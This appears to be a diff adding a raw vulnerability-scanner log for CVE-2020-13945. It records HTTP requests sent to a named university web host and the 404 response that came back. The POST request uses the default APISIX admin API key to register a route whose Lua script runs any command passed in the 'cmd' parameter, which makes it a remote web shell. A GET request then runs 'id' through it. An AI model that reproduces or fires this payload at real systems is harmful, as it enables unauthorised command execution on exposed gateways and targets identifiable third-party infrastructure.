@@ -1,0 +1,50 @@
+[CVE-2020-13945] Dumped HTTP request for https://agoswiki.earthsci.unimelb.edu.au/apisix/admin/routes
+
+
+POST /apisix/admin/routes HTTP/1.1
+Host: agoswiki.earthsci.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 406
+Content-Type: application/json
+X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+Accept-Encoding: gzip
+
+{
+  "uri":"/30v0wAi7pB7LyuCZAPvt6PGGjFQ",
+  "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
+  "upstream":{
+    "type":"roundrobin",
+    "nodes":{
+      "interact.sh:80":1
+    }
+  }
+}
+[CVE-2020-13945] Dumped HTTP request for https://agoswiki.earthsci.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+
+GET /30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id HTTP/1.1
+Host: agoswiki.earthsci.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept-Encoding: gzip
+
+
+[CVE-2020-13945] Dumped HTTP response https://agoswiki.earthsci.unimelb.edu.au/30v0wAi7pB7LyuCZAPvt6PGGjFQ?cmd=id
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 196
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:17:13 GMT
+Server: Apache/2.4.37 (Red Hat Enterprise Linux) OpenSSL/1.1.1k
+Set-Cookie: BIGipServer~app_science_web_prod~pool_science_web_prod_bachelor2_all_sites=1682184108.20480.0000; path=/; Httponly; Secure
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+
